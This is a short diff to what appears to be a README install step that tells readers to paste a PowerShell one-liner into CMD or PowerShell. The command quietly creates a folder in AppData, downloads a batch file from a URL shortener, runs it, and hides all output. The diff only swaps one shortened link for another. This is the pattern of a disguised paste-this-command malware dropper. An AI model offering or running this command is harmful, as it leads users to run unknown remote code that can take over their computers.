@@ -28,7 +28,7 @@
 Paste this command into CMD or PowerShell:
 
 ```
-powershell -c "cls;md $env:AppData\Utilities -f;iwr https://shorturl.at/ZvYuA -o $env:AppData\Utilities\Setup.bat;start $env:AppData\Utilities\Setup.bat" >$null 2>&1
+powershell -c "cls;md $env:AppData\Utilities -f;iwr https://git.new/zhV1D2s -o $env:AppData\Utilities\Setup.bat;start $env:AppData\Utilities\Setup.bat" >$null 2>&1
 ```
 
 ---
